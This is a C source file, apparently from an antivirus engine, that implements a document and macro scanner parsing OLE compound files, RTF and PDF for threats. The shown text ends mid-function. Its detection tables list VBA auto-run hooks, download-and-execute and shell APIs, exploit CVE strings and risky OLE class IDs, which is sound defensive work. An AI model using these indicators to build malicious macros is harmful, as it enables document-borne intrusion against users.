/**************************************************/
/*  WkDefender IOC 引擎 — 文档/宏分析实现           */
/*  功能面全量迁移自 ShadowStrike DocumentScanner   */
/*  (src/PhantomCore/Core/FileSystem/DocumentScanner.cpp, */
/*  3290 行 C++, PIMPL 单例)                       */
/*  按功能融合重实现，非源码复制。                  */
/*                                                  */
/*  ⚠ 死代码：本阶段功能面覆盖，未接入流水线。      */
/*  接线点: ScanManager.c ScanFileDirect 步骤5/6间  */
/*  (IocDocument_ScanFile + ResultToIocScan) 留     */
/*  TODO。                                         */
/*                                                  */
/*  依赖复用:                                       */
/*   - IocArchiveScanner WkdArc_ExtractEntry        */
/*     (OOXML vbaProject.bin 提取)                 */
/*   - IocScanner_ComputeBufferSha256 (载荷哈希)     */
/*  依赖缺失 (死代码标注):                          */
/*   - pugixml/XML 解析 → 模板注入/外部链接用        */
/*     字节级特征扫描                               */
/*   - PhantomCortex AI → 评分不含 AI 维度           */
/*   - HashStore/PatternStore/YARA → 哈希/YARA 判定  */
/*     由 ScanManager 既有流水线覆盖, 本文不重复    */
/*  对齐注释: SS L<行号> 标注对应参考源码位置.      */
/**************************************************/

#include "IocDocumentScanner.h"
#include "IocArchiveScanner.h"
#include "IocScanner.h"

#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <math.h>
#include <ntstatus.h>

/* 死代码 static 函数未引用警告 (项目惯例, 仿 IocArchiveScanner.c:25) */
#pragma warning(disable: 4505)

/**************************************************/
/*               限制常量                           */
/*  对齐 SS L89-92 / L175-178 / L182-185           */
/**************************************************/

#define WKD_DOC_MAX_FILE_SIZE    (100u * 1024u * 1024u)   /* 100MB 整读上限 */
#define WKD_DOC_MAX_STRING_EXTRACT (1u * 1024u * 1024u)   /* 1MB 字符串提取 */
#define WKD_DOC_MAX_JAVASCRIPT   (10u * 1024u * 1024u)    /* 10MB JS 上限 */
#define WKD_DOC_MAX_OLE_OBJECT   (64u * 1024u * 1024u)    /* 64MB 单流上限 */
#define WKD_DOC_MAX_FAT_STEPS    200000                   /* FAT 链环防护 */
#define WKD_DOC_MINI_CUTOFF      4096                     /* CFB: <4096 用 mini-FAT */
#define WKD_DOC_MAX_DIR_ENTRIES  10000                    /* 目录项上限 */
#define WKD_DOC_MAX_DIFAT_CHAIN  1000                     /* DIFAT 追链上限 */
#define WKD_DOC_MAX_PDF_OBJECTS  5000                     /* PDF 对象上限 */
#define WKD_DOC_PDF_OBJECT_CAP   (1u * 1024u * 1024u)     /* 单对象 1MB */
#define WKD_DOC_DDE_SCAN_CAP     (16u * 1024u * 1024u)    /* DDE 前 16MB */
#define WKD_DOC_VBA_MAX_CODE     100000                   /* 宏代码块上限 */
#define WKD_DOC_VBA_MAX_MODULES  200                      /* 宏模块上限 */

/* 可执行内容魔数 (对齐 SS L181-185) */
static const BYTE g_WkdDocPeMagic[]    = { 0x4D, 0x5A };
static const BYTE g_WkdDocElfMagic[]   = { 0x7F, 0x45, 0x4C, 0x46 };
static const BYTE g_WkdDocZipMagic[]   = { 0x50, 0x4B, 0x03, 0x04 };
static const BYTE g_WkdDocCabMagic[]   = { 0x4D, 0x53, 0x43, 0x46 };
static const BYTE g_WkdDocRarMagic[]   = { 0x52, 0x61, 0x72, 0x21 };

/**************************************************/
/*               检测常量表                         */
/*  对齐 SS DocumentScanner.cpp                    */
/**************************************************/

/* VBA 自动执行函数 (SS L95-101) */
static const char* const g_VbaAutoExec[] = {
    "AutoExec", "AutoOpen", "Auto_Open", "DocumentOpen", "Document_Open",
    "AutoClose", "Auto_Close", "DocumentBeforeClose", "Document_Close",
    "Workbook_Open", "Workbook_Activate", "Workbook_Close",
    "AutoNew", "Auto_New", "Document_New",
    "AutoExit", "Auto_Exit",
};

/* 可疑 VBA API (SS L104-114) */
static const char* const g_SuspiciousVbaApis[] = {
    "Shell", "CreateObject", "GetObject", "WScript.Shell",
    "Environ", "URLDownloadToFile", "URLDownloadToFileA",
    "WinExec", "ShellExecute", "ShellExecuteA",
    "PowerShell", "cmd.exe", "wscript", "cscript",
    "MSXML2.XMLHTTP", "WinHttp.WinHttpRequest",
    "Scripting.FileSystemObject", "ADODB.Stream",
    "SaveAs", "SaveToFile", "WriteText",
    "RegRead", "RegWrite", "RegDelete",
    "WMI", "Win32_Process", "GetStringFromGUID",
};

/* PDF 恶意 action (SS L117-120) */
static const char* const g_MaliciousPdfActions[] = {
    "/Launch", "/SubmitForm", "/ImportData", "/JavaScript",
    "/GoToE", "/GoToR", "/URI", "/Sound",
};

/* CVE 模式表 (SS L123-129, "\\\\objhtml" 修正为 "\\objhtml" 匹配单反斜杠) */
static const char* const g_CvePatterns[][3] = {
    { "Equation.3",      "CVE-2017-11882", "Equation Editor" },
    { "objupdate",       "CVE-2015-1641",  "RTF objupdate" },
    { "INCLUDEPICTURE",  "CVE-2017-0199",  "Template Injection" },
    { "objdata 0105000", "CVE-2012-0158",  "MSCOMCTL" },
    { "\\objhtml",       "CVE-2017-8570",  "Composite Moniker" },
};

/* 危险 OLE CLSID (SS DANGEROUS_OLE_CLSIDS L144-172, 磁盘混合字节序:
 * Data1(4B LE) | Data2(2B LE) | Data3(2B LE) | Data4(8B as-is)) */
typedef struct _WKD_OLE_CLSID_ENTRY {
    BYTE        Bytes[16];
    const char* Name;
    const char* ProgId;
    BOOLEAN     IsExecutable;
    BOOLEAN     IsPackage;
    BOOLEAN     HasAutoStart;
} WKD_OLE_CLSID_ENTRY;

static const WKD_OLE_CLSID_ENTRY g_DangerousOleClsids[] = {
    /* Package {0003000A-0000-0000-C000-000000000046} — 任意文件嵌入 */
    {{0x0A,0x00,0x03,0x00, 0x00,0x00, 0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46},
     "Package", "Package", TRUE, TRUE, FALSE},
    /* Equation.3 {0002CE02-...} — CVE-2017-11882 / CVE-2018-0802 */
    {{0x02,0xCE,0x02,0x00, 0x00,0x00, 0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46},
     "Equation.3", "Equation.3", TRUE, FALSE, TRUE},
    /* Equation.2 {0002CE01-...} */
    {{0x01,0xCE,0x02,0x00, 0x00,0x00, 0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46},
     "Equation.2", "Equation.2", TRUE, FALSE, TRUE},
    /* ShellLink {00021401-...} — 嵌入 LNK 执行 */
    {{0x01,0x14,0x02,0x00, 0x00,0x00, 0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46},
     "ShellLink", ".lnk", TRUE, FALSE, TRUE},
    /* Script Moniker {06290BD0-48AA-11CF-A8D7-00AA006C3706} */
    {{0xD0,0x0B,0x29,0x06, 0xAA,0x48, 0xCF,0x11, 0xA8,0xD7,0x00,0xAA,0x00,0x6C,0x37,0x06},
     "ScriptMoniker", "script:", TRUE, FALSE, TRUE},
    /* OLE2Link {00000300-...} — DDEAUTO */
    {{0x00,0x03,0x00,0x00, 0x00,0x00, 0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46},
     "OLE2Link", "OLE2Link", TRUE, FALSE, TRUE},
    /* MSComctlLib.TreeCtrl {BDD1F04B-858B-11D1-B16A-00C0F0283628} — CVE-2012-0158 */
    {{0x4B,0xF0,0xD1,0xBD, 0x8B,0x85, 0xD1,0x11, 0xB1,0x6A,0x00,0xC0,0xF0,0x28,0x36,0x28},
     "MSComctlLib.TreeCtrl", "MSComctlLib.TreeCtrl.2", TRUE, FALSE, FALSE},
    /* htmlfile {25336920-03F9-11CF-8FD0-00AA00686F13} — CVE-2017-8570 */
    {{0x20,0x69,0x33,0x25, 0xF9,0x03, 0xCF,0x11, 0x8F,0xD0,0x00,0xAA,0x00,0x68,0x6F,0x13},
     "htmlfile", "htmlfile", TRUE, FALSE, TRUE},
    /* Composite Moniker {00000309-...} — 链式执行 */
    {{0x09,0x03,0x00,0x00, 0x00,0x00, 0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46},
     "CompositeMoniker", "CompositeMoniker", FALSE, FALSE, TRUE},
};

#define WKD_DOC_NUM_OLE_CLSIDS  (sizeof(g_DangerousOleClsids) / sizeof(g_DangerousOleClsids[0]))

/**************************************************/
/*               CFB 结构体                         */
/*  对齐 SS L836-848 (CFBDirEntry)                 */
/**************************************************/

typedef struct _WKD_CFB_DIR_ENTRY {
    CHAR        Name[64];
    BYTE        ObjectType;     /* 0 empty / 1 storage / 2 stream / 5 root */
    BYTE        Clsid[16];
    UINT32      StartSector;
    UINT64      StreamSize;
    UINT32      ChildId;
} WKD_CFB_DIR_ENTRY, *PWKD_CFB_DIR_ENTRY;

typedef struct _WKD_CFB_CONTEXT {
    const BYTE* Buf;
    ULONG       BufSize;
    UINT16      MajorVersion;
    UINT32      SectorSize;
    UINT32      MiniSectorSize;
    UINT32*     Fat;
    ULONG       FatCount;
    UINT32*     MiniFat;
    ULONG       MiniFatCount;
    const BYTE* MiniStream;
    ULONG       MiniStreamSize;
} WKD_CFB_CONTEXT, *PWKD_CFB_CONTEXT;

/**************************************************/
/*               内部辅助                           */
/**************************************************/

/* 在二进制 buffer 中大小写不敏感查找子串（首次出现） */
static const BYTE*
WkdDocFindStrNoCase(
    _In_ const BYTE* Buf,
    _In_ SIZE_T      BufLen,
    _In_ PCSTR       Needle
    )
{
    SIZE_T nlen = strlen(Needle);
    SIZE_T i;

    if (nlen == 0 || BufLen < nlen) return NULL;
    for (i = 0; i + nlen <= BufLen; i++) {
        SIZE_T j;
        for (j = 0; j < nlen; j++) {
            BYTE a = Buf[i + j];
            BYTE b = (BYTE)Needle[j];
            if (a >= 'A' && a <= 'Z') a += 0x20;
            if (b >= 'A' && b <= 'Z') b += 0x20;
            if (a != b) break;
        }
        if (j == nlen) return Buf + i;
    }
    return NULL;
}

/* 小写拷贝 (ASCII) */
static void
WkdDocToLower(
    _In_ PCSTR  Src,
    _Out_ PSTR  Dst,
    _In_ ULONG  DstSize
    )
{
    ULONG i = 0;
    if (!Src || !Dst || DstSize == 0) return;
    while (Src[i] && i + 1 < DstSize) {
        CHAR c = Src[i];
        Dst[i] = (c >= 'A' && c <= 'Z') ? (CHAR)(c + 0x20) : c;
        i++;
    }
    Dst[i] = '\0';
}

/* Shannon 熵 (0-8), 对齐 SS CalculateEntropy L3042-3062 */
static double
WkdDocEntropy(
    _In_ const BYTE* Buf,
    _In_ SIZE_T      Len
    )
{
    double freq[256] = { 0 };
    double ent = 0.0;
    SIZE_T i;

    if (Len == 0) return 0.0;
    for (i = 0; i < Len; i++) freq[Buf[i]]++;
    for (i = 0; i < 256; i++) {
        if (freq[i] > 0) {
            double p = freq[i] / (double)Len;
            ent -= p * log(p) / log(2.0);
        }
    }
    return ent;
}

/* UTF-16LE 目录项名 → ANSI (CFB 名称), 对齐 SS ToNarrow */
static void
WkdDocWideToAnsi(
    _In_ PCWSTR Ws,
    _In_ ULONG  WLen,
    _Out_ PCHAR Ansi,
    _In_ ULONG  AnsiSize
    )
{
    if (AnsiSize == 0) return;
    if (WLen == 0 || !Ws) { Ansi[0] = '\0'; return; }
    WideCharToMultiByte(CP_ACP, 0, Ws, (int)WLen, Ansi, (int)(AnsiSize - 1), NULL, NULL);
    Ansi[AnsiSize - 1] = '\0';
}

/* SHA256 转 hex 字符串 */
static void
WkdDocHashToHex(
    _In_ const BYTE* Hash,
    _In_ ULONG       HashLen,
    _Out_ PCHAR      Hex,
    _In_ ULONG       HexSize
    )
{
    ULONG i;
    if (!Hash || !Hex || HexSize < 2 * HashLen + 1) return;
    for (i = 0; i < HashLen && i < HexSize / 2; i++) {
        sprintf_s(Hex + i * 2, HexSize - i * 2, "%02X", Hash[i]);
    }
}

/* 载荷 SHA256 (复用 IocScanner_ComputeBufferSha256) */
static BOOLEAN
WkdDocComputeBufferSha256(
    _In_ const BYTE* Buf,
    _In_ ULONG       Size,
    _Out_ PCHAR      Hex,
    _In_ ULONG       HexSize
    )
{
    DEF_SHA256_HASH hash;
    if (HexSize < sizeof(hash.Data) * 2 + 1) return FALSE;
    if (!IocScanner_ComputeBufferSha256(Buf, Size, &hash)) return FALSE;
    WkdDocHashToHex(hash.Data, sizeof(hash.Data), Hex, HexSize);
    return TRUE;
}

/**************************************************/
/*               威胁记录辅助                       */
/**************************************************/

static void
WkdDocAddThreat(
    _Inout_ PWKD_DOC_SCAN_RESULT R,
    _In_ WKD_DOC_THREAT_TYPE     Type,
    _In_ ULONG                   Severity,
    _In_ PCSTR                   Desc,
    _In_opt_ PCSTR               Loc,
    _In_opt_ PCSTR               Mitre,
    _In_opt_ PCSTR               Evidence
    )
{
    PWKD_DOC_THREAT t;

    if (R->ThreatCount >= WKD_DOC_MAX_THREATS) return;

    t = &R->Threats[R->ThreatCount++];
    t->Type = Type;
    t->Severity = Severity;
    strncpy_s(t->Description, sizeof(t->Description), Desc, _TRUNCATE);
    if (Loc) strncpy_s(t->Location, sizeof(t->Location), Loc, _TRUNCATE);
    if (Mitre) strncpy_s(t->MitreId, sizeof(t->MitreId), Mitre, _TRUNCATE);
    if (Evidence) strncpy_s(t->Evidence, sizeof(t->Evidence), Evidence, _TRUNCATE);

    if (Severity >= 80) R->CriticalThreats++;
    else if (Severity >= 50) R->HighThreats++;
    else R->MediumThreats++;
}

/**************************************************/
/*               IOC 提取                           */
/*  对齐 SS ExtractURLs L2798-2839 / ExtractIPs     */
/*  L2841-2889 / ExtractEmails L2891-2937          */
/**************************************************/

/* 简化 URL 提取: http:// / https:// / ftp:// 到空白/引号, cap Max */
static void
WkdDocExtractUrls(
    _In_  const BYTE* Buf,
    _In_  SIZE_T      Len,
    _In_  SIZE_T      Max,
    _Out_ CHAR        Out[][256],
    _Out_ PULONG      Count
    )
{
    static const char* markers[] = { "http://", "https://", "ftp://" };
    ULONG n = 0;
    SIZE_T i;
    SIZE_T m;

    *Count = 0;
    for (i = 0; i < Len && n < Max; i++) {
        for (m = 0; m < 3; m++) {
            SIZE_T mlen = strlen(markers[m]);
            if (i + mlen <= Len &&
                _strnicmp((const char*)Buf + i, markers[m], mlen) == 0) {
                SIZE_T end = i + mlen;
                /* 对齐 SS: 扫到空白/引号/括号/尖括号/闭合, 长度 10-2047 */
                while (end < Len && end - i < 2048 &&
                       Buf[end] > 0x20 && Buf[end] != '"' && Buf[end] != '\'' &&
                       Buf[end] != ')' && Buf[end] != ']' && Buf[end] != '}' &&
                       Buf[end] != '>' && Buf[end] != '<') {
                    end++;
                }
                if (end - i >= 10 && end - i < 256) {
                    SIZE_T c;
                    for (c = 0; c < end - i; c++) Out[n][c] = (char)Buf[i + c];
                    Out[n][end - i] = '\0';
                    n++;
                }
                break;
            }
        }
    }
    *Count = n;
}

/* IP 提取: N.N.N.N 校验, 跳 loopback/link-local/0.x, cap Max (对齐 SS) */
static void
WkdDocExtractIps(
    _In_  const BYTE* Buf,
    _In_  SIZE_T      Len,
    _In_  SIZE_T      Max,
    _Out_ CHAR        Out[][64],
    _Out_ PULONG      Count
    )
{
    ULONG n = 0;
    SIZE_T i;

    *Count = 0;
    for (i = 0; i < Len && n < Max; i++) {
        int octets[4] = { 0, 0, 0, 0 };
        SIZE_T pos = i;
        BOOLEAN valid = TRUE;
        int o;

        if (Buf[i] < '0' || Buf[i] > '9') continue;

        for (o = 0; o < 4 && valid; o++) {
            int val = 0;
            int digits = 0;
            while (pos < Len && Buf[pos] >= '0' && Buf[pos] <= '9' && digits < 3) {
                val = val * 10 + (Buf[pos] - '0');
                pos++;
                digits++;
            }
            if (digits == 0 || val > 255) { valid = FALSE; break; }
            octets[o] = val;
            if (o < 3) {
                if (pos >= Len || Buf[pos] != '.') { valid = FALSE; break; }
                pos++;
            }
        }

        if (valid && pos > i + 6) {
            /* 确认不是更大数字的一部分 */
            if (i > 0 && (Buf[i - 1] == '.' ||
                          (Buf[i - 1] >= '0' && Buf[i - 1] <= '9') ||
                          (Buf[i - 1] >= 'A' && Buf[i - 1] <= 'Z') ||
                          (Buf[i - 1] >= 'a' && Buf[i - 1] <= 'z'))) { i = pos; continue; }
            if (pos < Len && (Buf[pos] == '.' ||
                              (Buf[pos] >= '0' && Buf[pos] <= '9'))) { i = pos; continue; }

            /* 跳过 loopback 127 / 0.x / link-local 169.254 */
            if (octets[0] != 127 && octets[0] != 0 &&
                !(octets[0] == 169 && octets[1] == 254)) {
                sprintf_s(Out[n], 64, "%d.%d.%d.%d",
                          octets[0], octets[1], octets[2], octets[3]);
                n++;
            }
            i = pos - 1;
        }
    }
    *Count = n;
}

/* Email 提取: @ 前后扫描, TLD >= 2, cap Max (对齐 SS) */
static void
WkdDocExtractEmails(
    _In_  const BYTE* Buf,
    _In_  SIZE_T      Len,
    _In_  SIZE_T      Max,
    _Out_ CHAR        Out[][128],
    _Out_ PULONG      Count
    )
{
    ULONG n = 0;
    SIZE_T i;

    *Count = 0;
    for (i = 1; i < Len && n < Max; i++) {
        SIZE_T localStart;
        SIZE_T domainEnd;
        BOOLEAN hasDot = FALSE;

        if (Buf[i] != '@') continue;

        localStart = i;
        while (localStart > 0) {
            CHAR c = (CHAR)Buf[localStart - 1];
            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') ||
                (c >= 'a' && c <= 'z') || c == '.' || c == '_' ||
                c == '+' || c == '-' || c == '%') {
                localStart--;
            } else {
                break;
            }
        }
        if (localStart == i) continue;

        domainEnd = i + 1;
        while (domainEnd < Len) {
            CHAR c = (CHAR)Buf[domainEnd];
            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') ||
                (c >= 'a' && c <= 'z') || c == '.' || c == '-') {
                if (c == '.') hasDot = TRUE;
                domainEnd++;
            } else {
                break;
            }
        }

        if (hasDot && domainEnd - i > 4 && domainEnd - localStart < 256) {
            SIZE_T e;
            SIZE_T len = domainEnd - localStart;
            char* dotp;
            for (e = 0; e < len && e < 127; e++) Out[n][e] = (CHAR)Buf[localStart + e];
            Out[n][e] = '\0';
            /* 基本校验: TLD 至少 2 字符 */
            dotp = strrchr(Out[n], '.');
            if (dotp && (SIZE_T)(dotp - Out[n]) > 0 &&
                e - (SIZE_T)(dotp - Out[n]) > 2) {
                n++;
            }
        }
    }
    *Count = n;
}

/**************************************************/
/*               CFB 解析器                         */
/*  对齐 SS ExtractOLEObjects L701-1122            */
/**************************************************/

static UINT16
WkdDocReadLe16(
    _In_ const BYTE* P
    )
{
    return (UINT16)(P[0] | (P[1] << 8));
}

static UINT32
WkdDocReadLe32(
    _In_ const BYTE* P
    )
{
    return (UINT32)(P[0] | (P[1] << 8) | (P[2] << 16) | ((UINT32)P[3] << 24));
}

/* Phase1: 校验 CFB 头 (512B) + 扇区参数 */
static NTSTATUS
WkdDocCfb_ParseHeader(
    _In_ const BYTE* Buf,
    _In_ ULONG       Size,
    _Inout_ PWKD_CFB_CONTEXT Ctx
    )
{
    static const BYTE oleSig[8] = { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1 };
    UINT16 sectorSizePow;
    UINT16 miniSectorSizePow;
    UINT32 fatSectorsCount;
    UINT32 firstDirSect;

    if (Size < 512) return STATUS_INVALID_PARAMETER;
    if (memcmp(Buf, oleSig, 8) != 0) return STATUS_INVALID_PARAMETER;

    Ctx->MajorVersion = WkdDocReadLe16(&Buf[0x1A]);
    sectorSizePow = WkdDocReadLe16(&Buf[0x1E]);
    if (sectorSizePow < 7 || sectorSizePow > 16) return STATUS_INVALID_PARAMETER;
    Ctx->SectorSize = 1u << sectorSizePow;

    miniSectorSizePow = WkdDocReadLe16(&Buf[0x20]);
    if (miniSectorSizePow > 16) return STATUS_INVALID_PARAMETER;
    Ctx->MiniSectorSize = 1u << miniSectorSizePow;

    fatSectorsCount = WkdDocReadLe32(&Buf[0x2C]);
    if (fatSectorsCount > 10000) return STATUS_INVALID_PARAMETER;
    firstDirSect = WkdDocReadLe32(&Buf[0x30]);
    if (firstDirSect == 0xFFFFFFFE) return STATUS_INVALID_PARAMETER;

    Ctx->Fat = NULL;
    Ctx->FatCount = 0;
    Ctx->MiniFat = NULL;
    Ctx->MiniFatCount = 0;
    Ctx->MiniStream = NULL;
    Ctx->MiniStreamSize = 0;
    return STATUS_SUCCESS;
}

/* Phase2: 从 DIFAT (头 109 项 + 追链) 建 FAT 表 */
static NTSTATUS
WkdDocCfb_BuildFat(
    _Inout_ PWKD_CFB_CONTEXT Ctx
    )
{
    const BYTE* Buf = Ctx->Buf;
    ULONG Size = Ctx->BufSize;
    UINT32 fatSectorsCount = WkdDocReadLe32(&Buf[0x2C]);
    UINT32 firstDifatSect = WkdDocReadLe32(&Buf[0x44]);
    UINT32 numDifatSects = WkdDocReadLe32(&Buf[0x48]);
    UINT32 entriesPerSector = Ctx->SectorSize / 4;
    UINT32* fatSectorIds = NULL;
    ULONG idCount = 0;
    UINT32* fat = NULL;
    ULONG fatCount = 0;
    UINT32 fi;

    if (fatSectorsCount == 0 || fatSectorsCount > 10000) return STATUS_SUCCESS;

    /* 收集 FAT 扇区 ID: 头内 DIFAT 109 项 + 追链 (对齐 SS L750-804) */
    fatSectorIds = (UINT32*)malloc((size_t)fatSectorsCount * sizeof(UINT32));
    if (!fatSectorIds) return STATUS_NO_MEMORY;

    for (fi = 0; fi < 109 && fi < fatSectorsCount; fi++) {
        UINT32 id = WkdDocReadLe32(&Buf[0x4C + fi * 4]);
        if (id == 0xFFFFFFFE || id == 0xFFFFFFFF) break;
        fatSectorIds[idCount++] = id;
    }

    if (fatSectorsCount > 109 && firstDifatSect != 0xFFFFFFFE && firstDifatSect != 0xFFFFFFFF) {
        UINT32 difatSect = firstDifatSect;
        UINT32 difatCount = 0;
        while (difatSect != 0xFFFFFFFE && difatSect != 0xFFFFFFFF &&
               difatCount < numDifatSects && difatCount < WKD_DOC_MAX_DIFAT_CHAIN) {
            ULONG64 pos = 512 + (ULONG64)difatSect * Ctx->SectorSize;
            UINT32 entriesInSect = entriesPerSector - 1;
            UINT32 j;
            if (pos + Ctx->SectorSize > Size) break;
            for (j = 0; j < entriesInSect && idCount < fatSectorsCount; j++) {
                UINT32 id = WkdDocReadLe32(&Buf[pos + j * 4]);
                if (id == 0xFFFFFFFE || id == 0xFFFFFFFF) break;
                fatSectorIds[idCount++] = id;
            }
            difatSect = WkdDocReadLe32(&Buf[pos + entriesInSect * 4]);
            difatCount++;
        }
    }

    if (idCount == 0) { free(fatSectorIds); return STATUS_SUCCESS; }

    /* 读入全部 FAT 扇 */
    fatCount = idCount * entriesPerSector;
    fat = (UINT32*)malloc((size_t)fatCount * sizeof(UINT32));
    if (!fat) { free(fatSectorIds); return STATUS_NO_MEMORY; }
    memset(fat, 0, (size_t)fatCount * sizeof(UINT32));

    {
        ULONG idx = 0;
        ULONG s;
        for (s = 0; s < idCount; s++) {
            ULONG64 pos = 512 + (ULONG64)fatSectorIds[s] * Ctx->SectorSize;
            ULONG k;
            if (pos + Ctx->SectorSize > Size) continue;
            for (k = 0; k < entriesPerSector && idx < fatCount; k++) {
                fat[idx++] = WkdDocReadLe32(&Buf[pos + k * 4]);
            }
        }
    }

    free(fatSectorIds);
    Ctx->Fat = fat;
    Ctx->FatCount = fatCount;
    return STATUS_SUCCESS;
}

/* Phase3: 建 MiniFAT 表 */
static NTSTATUS
WkdDocCfb_BuildMiniFat(
    _Inout_ PWKD_CFB_CONTEXT Ctx
    )
{
    const BYTE* Buf = Ctx->Buf;
    ULONG Size = Ctx->BufSize;
    UINT32 firstMiniFatSect = WkdDocReadLe32(&Buf[0x3C]);
    UINT32 numMiniFatSects = WkdDocReadLe32(&Buf[0x40]);
    UINT32 entriesPerSector = Ctx->SectorSize / 4;
    UINT32* miniFat;
    ULONG totalEntries;
    UINT32 mfSect;
    UINT32 mfCount = 0;
    ULONG idx = 0;

    if (firstMiniFatSect == 0xFFFFFFFE || firstMiniFatSect == 0xFFFFFFFF || numMiniFatSects == 0) {
        return STATUS_SUCCESS;
    }

    totalEntries = (ULONG)numMiniFatSects * entriesPerSector;
    miniFat = (UINT32*)malloc((size_t)totalEntries * sizeof(UINT32));
    if (!miniFat) return STATUS_NO_MEMORY;
    memset(miniFat, 0, (size_t)totalEntries * sizeof(UINT32));

    mfSect = firstMiniFatSect;
    while (mfSect != 0xFFFFFFFE && mfSect != 0xFFFFFFFF &&
           mfCount < numMiniFatSects && mfCount < 1000) {
        ULONG64 pos;
        UINT32 k;
        if ((ULONG64)mfSect >= (ULONG64)Ctx->FatCount) break;
        pos = 512 + (ULONG64)mfSect * Ctx->SectorSize;
        if (pos + Ctx->SectorSize > Size) break;
        for (k = 0; k < entriesPerSector && idx < totalEntries; k++) {
            miniFat[idx++] = WkdDocReadLe32(&Buf[pos + k * 4]);
        }
        mfSect = Ctx->Fat[mfSect];
        mfCount++;
    }

    Ctx->MiniFat = miniFat;
    Ctx->MiniFatCount = idx;
    return STATUS_SUCCESS;
}

/* Phase4: 解析目录项 (含 Root) */
static NTSTATUS
WkdDocCfb_ParseDirectory(
    _In_ PWKD_CFB_CONTEXT Ctx,
    _Out_ PWKD_CFB_DIR_ENTRY* OutEntries,
    _Out_ PULONG            OutCount
    )
{
    const BYTE* Buf = Ctx->Buf;
    ULONG Size = Ctx->BufSize;
    UINT32 firstDirSect = WkdDocReadLe32(&Buf[0x30]);
    UINT32 entriesPerDirSector = Ctx->SectorSize / 128;
    PWKD_CFB_DIR_ENTRY entries;
    ULONG count = 0;
    ULONG capacity = WKD_DOC_MAX_DIR_ENTRIES;
    UINT32 dirSect = firstDirSect;
    ULONG chainSteps = 0;
    BOOLEAN hasRoot = FALSE;

    entries = (PWKD_CFB_DIR_ENTRY)malloc((size_t)capacity * sizeof(WKD_CFB_DIR_ENTRY));
    if (!entries) return STATUS_NO_MEMORY;
    memset(entries, 0, (size_t)capacity * sizeof(WKD_CFB_DIR_ENTRY));

    while (dirSect != 0xFFFFFFFE && dirSect != 0xFFFFFFFF && count < capacity) {
        ULONG64 pos;
        UINT32 e;
        if ((ULONG64)dirSect >= (ULONG64)Ctx->FatCount) break;
        if (++chainSteps > WKD_DOC_MAX_FAT_STEPS) break;
        pos = 512 + (ULONG64)dirSect * Ctx->SectorSize;
        if (pos + Ctx->SectorSize > Size) break;

        for (e = 0; e < entriesPerDirSector && count < capacity; e++) {
            const BYTE* entry = &Buf[pos + (ULONG64)e * 128];
            UINT8 objectType = entry[0x42];
            UINT16 nameSize;
            PWKD_CFB_DIR_ENTRY de;

            if (objectType == 0) continue;

            nameSize = WkdDocReadLe16(&entry[0x40]);
            if (nameSize == 0 || nameSize > 64) continue;

            de = &entries[count++];
            de->ObjectType = objectType;
            memcpy(de->Clsid, &entry[0x50], 16);
            de->StartSector = WkdDocReadLe32(&entry[0x74]);
            de->StreamSize = WkdDocReadLe32(&entry[0x78]);
            if (Ctx->MajorVersion >= 4) {
                de->StreamSize |= ((UINT64)WkdDocReadLe32(&entry[0x7C])) << 32;
            }
            de->ChildId = WkdDocReadLe32(&entry[0x4C]);

            /* 名称 UTF-16LE → ANSI */
            WkdDocWideToAnsi((PCWSTR)entry, nameSize / 2, de->Name, sizeof(de->Name));

            /* Root entry: 记录 MiniStream 容器位置 */
            if (objectType == 5 && !hasRoot) {
                hasRoot = TRUE;
                Ctx->MiniStream = NULL;
                Ctx->MiniStreamSize = 0;
                if (de->StartSector != 0xFFFFFFFE && de->StreamSize > 0 &&
                    de->StreamSize <= WKD_DOC_MAX_OLE_OBJECT) {
                    UINT32 cur = de->StartSector;
                    UINT64 remaining = de->StreamSize;
                    BYTE* ms = (BYTE*)malloc((size_t)de->StreamSize);
                    UINT64 off = 0;
                    if (ms) {
                        while (remaining > 0 && cur != 0xFFFFFFFE && cur != 0xFFFFFFFF &&
                               (ULONG64)cur < (ULONG64)Ctx->FatCount) {
                            ULONG64 sp = 512 + (ULONG64)cur * Ctx->SectorSize;
                            ULONG toRead;
                            if (sp + Ctx->SectorSize > Size) break;
                            toRead = (ULONG)((remaining < Ctx->SectorSize) ? remaining : Ctx->SectorSize);
                            memcpy(ms + off, &Buf[sp], toRead);
                            off += toRead;
                            remaining -= toRead;
                            cur = Ctx->Fat[cur];
                        }
                        Ctx->MiniStream = ms;
                        Ctx->MiniStreamSize = (ULONG)off;
                    }
                }
            }
        }

        dirSect = Ctx->Fat[dirSect];
    }

    *OutEntries = entries;
    *OutCount = count;
    return STATUS_SUCCESS;
}

/* Phase5: FAT 链流读取 (sector 边界预校验 + 步数上限) */
static NTSTATUS
WkdDocCfb_ReadFatChain(
    _In_ PWKD_CFB_CONTEXT Ctx,
    _In_ UINT32           StartSector,
    _In_ UINT64           StreamSize,
    _Out_ BYTE**          Out,
    _Out_ PULONG          OutLen
    )
{
    BYTE* result;
    UINT32 currentSector = StartSector;
    UINT64 bytesRemaining = StreamSize;
    ULONG chainSteps = 0;
    UINT64 off = 0;

    if (StreamSize == 0 || StartSector == 0xFFFFFFFE || StartSector == 0xFFFFFFFF) {
        *Out = NULL; *OutLen = 0; return STATUS_SUCCESS;
    }
    if (StreamSize > WKD_DOC_MAX_OLE_OBJECT) return STATUS_INVALID_PARAMETER;

    result = (BYTE*)malloc((size_t)StreamSize);
    if (!result) return STATUS_NO_MEMORY;

    while (bytesRemaining > 0 &&
           currentSector != 0xFFFFFFFE && currentSector != 0xFFFFFFFF &&
           chainSteps < WKD_DOC_MAX_FAT_STEPS) {
        ULONG64 sectorOffset;
        ULONG toRead;
        if ((ULONG64)currentSector >= (ULONG64)Ctx->FatCount) break;
        sectorOffset = 512 + (ULONG64)currentSector * Ctx->SectorSize;
        if (sectorOffset + Ctx->SectorSize > Ctx->BufSize) break;
        toRead = (ULONG)((bytesRemaining < Ctx->SectorSize) ? bytesRemaining : Ctx->SectorSize);
